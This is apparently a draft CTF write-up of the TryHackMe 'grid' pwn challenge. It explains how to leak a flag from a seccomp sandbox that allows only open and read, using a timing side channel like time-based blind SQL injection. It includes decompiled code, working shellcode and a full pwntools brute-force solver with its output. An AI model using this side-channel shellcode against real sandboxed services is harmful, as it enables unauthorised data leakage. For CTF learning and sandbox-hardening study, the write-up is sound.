---
date: '2025-07-06T21:08:10+07:00'
draft: true
title: 'A Blind Pwn Challenge: Leaking Flags with Only Open and Read Syscalls (Grid, Industrial Intrusion 2025)'
---

About a week or two ago, I participated in Industrial Intursion, one of TryHackMe's capture the flag events. In it was **grid**, a pwn challenge that revolved around writing shellcode to leak the contents of the flag file. While seemingly easy enough, upon further inspection, you would find that there has been a seccomp rule put in place to allow only the **open** and **read** syscalls. This poses an interesting challenge because while you are able to open and read the flag, you wouldn't be able to write out its contents as the write syscall is not part of the whitelist. So, what next? Is it possible to leak the contents of memory without directly writing it out? That's what we'll be exploring today.

# Challenge Overview

[Download Challenge Files](grid.zip)

```
$ ./grid
╔══════════════════════════════════════════╗
║     REMOTE GRID TERMINAL                 ║
╠══════════════════════════════════════════╣
║ 1. Connect Power AC                      ║
║ 2. Connect Power DC                      ║
║ 3. Emergency Exit                        ║
║ 4. Manual Processing                     ║
║ 0. Exit                                  ║
╚══════════════════════════════════════════╝
Select option: 
```

When first running the binary, we are greeted with a menu where we can choose 4 options. Since participants were only given a binary, we need to decompile and figure out what the binary does ourselves. After decompiling, you'll find that options 1-3 doesn't actually do anything and just causes the program to sleep for a couple of seconds. The only option that does something and worth digging into is option 4. Below is a cleaned-up version of the decompiled C code. For readability, I've renamed some functions and variables to be more descriptive and have removed some functions to focus only on option 4.

```c{linenos=true}
void *mmap_area;

void sandbox()
{
  __int64 v0; // [rsp+8h] [rbp-8h]

  v0 = seccomp_init(0);
  if ( !v0 )
  {
    puts("error");
    exit(0);
  }
  seccomp_rule_add(v0, 0x7FFF0000, 2, 0);
  seccomp_rule_add(v0, 0x7FFF0000, 0, 0);
  seccomp_rule_add(v0, 0x7FFF0000, 0x3C, 0);
  seccomp_rule_add(v0, 0x7FFF0000, 0xE7, 0);
  if ( (int)seccomp_load(v0) < 0 )
  {
    seccomp_release(v0);
    exit(0);
  }
  seccomp_release(v0);
}

void __fastcall manual_processing(void *buf)
{
  puts("Enter code to process : ");
  read(0, buf, 0x64u);
  puts("\nProcessing");
  sandbox();
  ((void (*)(void))buf)();
}

int __fastcall main(int argc, const char **argv, const char **envp)
{
  int choice; // [rsp+4h] [rbp-Ch] BYREF

  // ...omitted...

  mmap_area = mmap((void *)0xCAFE0000LL, 0x64u, 7, 34, -1, 0);
  if ( mmap_area == (void *)-1LL )
  {
    perror("mmap failed");
    return 1;
  }
  else
  {
    while ( 1 )
    {
      print_menu();
      if ( scanf("%d", &choice) != 1 )
        break;
      switch ( choice )
      {
        // omitted options 0-3
        case 4:
          manual_processing(mmap_area);
          break;
        default:
          puts("Unknown option. Please try again.");
          puts("\n");
          break;
      }
    }
    puts("Invalid input. Exiting...");
    return 0;
  }
}
```
Looking at the code, we can see that the program:
1. Mmaps a memory region at 0xCAFE0000 and sets its permission to be readable, writable, and executable.
2. When choosing option 4, it asks the user the user for input and places it in the mmapped region.
3. It then sets up a seccomp filter that only allows the open, read, exit, and exit_group syscalls.
4. Finally, it executes our shellcode.

For confirmation, you can run the program through `seccomp-tools` to find out the syscall whitelist.

```
$ seccomp-tools dump ./grid
...
Select option: 4
Enter code to process :
aaaa

Processing
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009
 0006: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0009
 0007: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0009
 0008: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x06 0x00 0x00 0x00000000  return KILL
```

## The Big Idea
While doing the challenge, I remembered something about blind SQL injections, specifically the ones that are time based. In a normal SQL injection, an attacker might get database contents, like user tables, by printing it directly to the screen after using a payload to retrieve it. However, sometimes printing data onto the screen is just not possible, in which case it becomes a **blind** scenario.

For example, a payload for a time-based SQL injection might be "Is the first character of the admin's password 'a'? If yes, then sleep for 5 seconds. If not, do nothing." By measuring the response time, we can get the answer to our question. Repeating this for every character reveals the entire password without ever seeing it directly.

The situation we have in this pwn challenge is very similar to the blind SQLi situation. We can open and read the flag into memory, but we have no way of seeing its contents. Therefore, we'll be applying the same concepts of a time-based SQLi to get the contents of the flag. The shellcode will leak the flag character by character by creating the same kind of artificial time delay. The plan is as follows.

---

1. Take a guess of the next unknown character of the flag.
2. Open the flag and read it into memory.
3. Compare our guess to the actual character in memory.
4. If the guess is correct, jump to some sort of busy-loop to make the program wait for a couple of seconds before exiting.
5. If the guess is incorrect, exit immediately.

---

Just like with the blind SQLi, we can measure the execution time of our shellcode. A long execution time indicates a correct guess, while a short one means an incorrect guess. By bruteforcing every possible character for each position, we can reconstruct the entire flag.

## Finding the File Name
First things first, we have to find out what the name of the flag actually is, as we are not given any info about it. My first guess was `flag.txt` as that is the name of the flag in the other challenges and is just a very common name in general. To do so, we apply the same principle. Call `open` on our guessed filename, then if it returns an integer greater than 0 (success), we jump to a busy-loop. Thus, we know that if the program takes a long time to finish, we have correctly guessed the filename.

```py{linenos=true}
wait_time = 1

io = start()

io.sendlineafter(b': ', b'4')

shellcode = asm(
f'''
    // Open flag.txt
    mov rsi, 0
    lea rdi, [rip + flag]
    mov rax, 2
    syscall

    cmp eax, 0

    jl wrong

    mov rax, 0x100000000
    right:
        dec rax
        test rax, rax
        jne right

    wrong:
        xor rdi, rdi
        mov rax, 0x3c
        syscall

    flag:
        .string "flag.txt"
''')

log.info(f'{hex(len(shellcode)) = }')
assert len(shellcode) <= 0x64

start_time = time.time()
io.sendafter(b': \n', bytes(shellcode))
io.recvuntil(b'Processing\n')

try:
    io.recv()
except EOFError:
    pass
finally:
    end_time = time.time()
    io.close()

if end_time - start_time > wait_time:
    print('Correct')
```

It turns out, the filename was indeed `flag.txt`, nice!

## Reading the Flag and Final Solver
After we've obtained the filename, we can implement our big idea and get the flag. Open `flag.txt`, read its contents into memory, take a character guess, then compare that guess with an index of the flag that is still unknown. If the guess is correct, then jump to the busy-loop. To make the bruteforce faster, I've pre-compiled the assembly and used the bytecode directly in the solver, then at every iteration, we just need to replace the unknown flag index and our guess character. Adjust the `wait_time` as needed.

```py{linenos=true}
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time
import string

context.terminal = 'wt.exe wsl -d Ubuntu'.split()
context.log_level = 'warn'

exe = context.binary = ELF(args.EXE or './grid')

host = args.HOST or '10.10.53.136'
port = int(args.PORT or 9002)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *manual_processing+87
continue
'''.format(**locals())

# -- Exploit goes here --

wait_time = 3
flag = b'THM{'
# flag = b'THM{nice_s1d3_ch'
while flag[-1] != ord('}'):
    for c in string.printable:
        print(f'Trying: {c}')

        io = start()

        io.sendlineafter(b': ', b'4')

        i = len(flag)
        # shellcode = asm(
        # f'''
        #     // Open flag.txt
        #     mov rsi, 0
        #     lea rdi, [rip + flag]
        #     mov rax, 2
        #     syscall

        #     // Read flag.txt
        #     mov rdx, 0x30
        #     lea rsi, [rip + flag]
        #     mov rdi, rax
        #     xor rax, rax
        #     syscall

        #     // Bruteforce each character
        #     lea rdi, [rip + flag]
        #     mov al, [rdi + {i}]
        #     cmp al, {ord(c)}

        #     jne wrong

        #     mov rax, 0x100000000
        #     right:
        #         dec rax
        #         test rax, rax
        #         jne right

        #     wrong:
        #         xor rdi, rdi
        #         mov rax, 0x3c
        #         syscall

        #     flag:
        #         .string "flag.txt"
        # ''')

        # basically the above shellcode, skips assembling so its faster
        shellcode = bytearray(b'H\xc7\xc6\x00\x00\x00\x00H\x8d=K\x00\x00\x00H\xc7\xc0\x02\x00\x00\x00\x0f\x05H\xc7\xc2\x30\x00\x00\x00H\x8d54\x00\x00\x00H\x89\xc7H1\xc0\x0f\x05H\x8d=%\x00\x00\x00\x8aG\x04<0u\x12H\xb8\x00\x00\x00\x00\x02\x00\x00\x00H\xff\xc8H\x85\xc0u\xf8H1\xffH\xc7\xc0<\x00\x00\x00\x0f\x05flag.txt\x00')
        shellcode[0x36] = i # flag index
        shellcode[0x38] = ord(c) # guess

        log.info(f'{hex(len(shellcode)) = }')
        assert len(shellcode) <= 0x64

        start_time = time.time()
        io.sendafter(b': \n', bytes(shellcode))
        io.recvuntil(b'Processing\n')

        try:
            io.recv()
        except EOFError:
            pass
        finally:
            end_time = time.time()
            io.close()

        if end_time - start_time > wait_time:
            flag += c.encode()
            print(f'{flag = }')
            break
```

```
$ ./solve.py
Trying: 0
Trying: 1
Trying: 2
Trying: 3
Trying: 4
Trying: 5
Trying: 6
Trying: 7
Trying: 8
Trying: 9
Trying: a
Trying: b
Trying: c
Trying: d
Trying: e
Trying: f
Trying: g
Trying: h
Trying: i
Trying: j
Trying: k
Trying: l
Trying: m
Trying: n
flag = b'THM{n'
Trying: 0
Trying: 1
Trying: 2

...

Trying: @
Trying: [
Trying: \
Trying: ]
Trying: ^
Trying: _
Trying: `
Trying: {
Trying: |
Trying: }
flag = b'THM{nice_s1d3_channel_look_toHave}'
```